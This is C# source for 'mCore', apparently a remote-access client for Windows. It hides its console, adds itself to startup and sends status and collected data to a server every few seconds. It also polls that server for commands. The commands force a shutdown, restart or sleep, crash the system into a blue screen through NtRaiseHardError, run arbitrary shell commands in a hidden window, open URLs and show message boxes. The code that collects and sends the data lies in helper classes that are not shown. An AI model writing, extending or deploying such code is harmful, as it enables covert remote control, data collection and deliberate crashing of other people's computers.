using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace mCore
{
    class Program
    {
        static string ID;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        static bool Lan = false;

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            while (Lan == false)
            {
                if(mCore_Controls.CheckServer() == true)
                {
                    Lan = true;
                }
            }

             if(mCore_Controls.CheckID() == false)
             {
                ShowWindow(handle, SW_SHOW);
                string txt = @"
  __  __    ____    ___    ____    _____ 
 |  \/  |  / ___|  / _ \  |  _ \  | ____|
 | |\/| | | |     | | | | | |_) | |  _|  
 | |  | | | |___  | |_| | |  _ <  | |___ 
 |_|  |_|  \____|  \___/  |_| \_\ |_____|
                                                                                                            ";
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine(txt);
                Console.WriteLine(@"                                         
Your device has not been registered before! Please set a password to install on your device.
----------------------------------------------------------------------------------------------
");
                Console.WriteLine("Enter Password:");
                string newpassword = Console.ReadLine();
                string newid = mCore_Controls.CreateDevice(newpassword);
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Cyan;
                ID = mCore_Regedit.Read("ID");
                mCore_Controls.CreateData();
                mCore_Controls.SendStatus(ID);
                mCore_Controls.SendData(ID, mCore_Controls.CreateData());
                Console.WriteLine(txt);
                Console.WriteLine(@"                                         
Your device has been registered! Please restart the application.
----------------------------------------------------------------------------------------------
");
                Console.WriteLine("ID: " + newid);
                Console.WriteLine("Password: " + newpassword);
                mCore_Regedit.AddStatup();
                Console.ReadLine();
            }
             else
             {
                ID = mCore_Regedit.Read("ID");
                mCore_Controls.CreateData();
                mCore_Controls.SendStatus(ID);
                mCore_Controls.SendData(ID, mCore_Controls.CreateData());
                mCore_Regedit.AddStatup();

                Thread Thread1 = new Thread(new ThreadStart(SendStatus)); Thread1.Start();
                Thread Thread2 = new Thread(new ThreadStart(SendData)); Thread2.Start();
                Thread Thread3 = new Thread(new ThreadStart(CheckTask)); Thread3.Start();
            }
        }
        static void SendStatus()
        {
            while (true)
            {
                mCore_Controls.SendStatus(ID);
                System.Threading.Thread.Sleep(60000);
            }
        }

        static void SendData()
        {
            while (true)
            {
                mCore_Controls.SendData(ID, mCore_Controls.CreateData());
                System.Threading.Thread.Sleep(10000);
            }
        }

        static void Cmd(string command)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo = new System.Diagnostics.ProcessStartInfo()
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process.Start();
        }
        static void CheckTask()
        {
            while(true)
            {
                try
                {
                    string data = mCore_Controls.ChechTask(ID);
                    //if (data != "0") Console.WriteLine(data);
                    if (data == "shutdown")
                    {
                        if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                        {
                            Cmd("shutdown -s -t 1");
                        }
                    }
                    else if (data == "restart")
                    {
                        if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                        {
                            Cmd("shutdown -r -t 1");
                        }
                    }
                    else if (data == "sleep")
                    {
                        if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                        {
                            Application.SetSuspendState(PowerState.Suspend, false, false);
                        }
                    }
                    else if (data == "bluescreen")
                    {
                        if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                        {
                            Boolean t1;
                            uint t2;
                            RtlAdjustPrivilege(19, true, false, out t1);
                            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                        }
                    }
                    else
                    {
                        string[] array = data.Split(',');
                        if (array[0] == "cmd")
                        {
                            string come = array[1];
                            if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                            {
                                Cmd(come);
                            }
                        }
                        else if (array[0] == "url")
                        {
                            string come = array[1];
                            if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                            {
                                System.Diagnostics.Process.Start(come);
                            }
                        }
                        else if (array[0] == "box")
                        {
                            string come = array[1];
                            if (mCore_Controls.SendTaskReset(ID) == "TRUE")
                            {
                                MessageBox.Show(come, "");
                            }
                        }
                        else
                        {
                            mCore_Controls.SendTaskReset(ID);
                        }
                    }     
                }
                catch { }
                System.Threading.Thread.Sleep(5000);
            }
        }
    }
}
